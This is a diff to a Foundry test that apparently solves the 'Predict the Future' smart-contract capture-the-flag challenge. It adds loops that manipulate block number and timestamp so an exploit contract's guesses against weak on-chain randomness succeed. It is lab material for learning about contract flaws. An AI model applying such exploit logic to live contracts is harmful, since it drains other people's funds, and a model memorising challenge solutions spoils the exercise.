@@ -22,6 +22,26 @@ contract PredictTheFutureTest is Test {
         vm.warp(93582192);
 
         // Put your solution here
+        uint8 i;
+        for( i= 0; i < 10; i++){
+             vm.roll(104293);
+             vm.warp(93582192);
+            exploitContract.lockInGuess{value: 1 ether}();
+            vm.roll(104293 + 2);
+            vm.warp(93582192 + 1000);
+            if(exploitContract.settle()){
+                break;
+            }
+        }
+       
+        for(uint8 j = 0; j < i ; j++){
+            vm.roll(104293);
+            vm.warp(93582192);
+            exploitContract.lockInGuessWithN{value: 1 ether}(i);
+            vm.roll(104293 + 2);
+            vm.warp(93582192 + 1000);
+            exploitContract.settle();
+        }
 
         _checkSolved();
     }
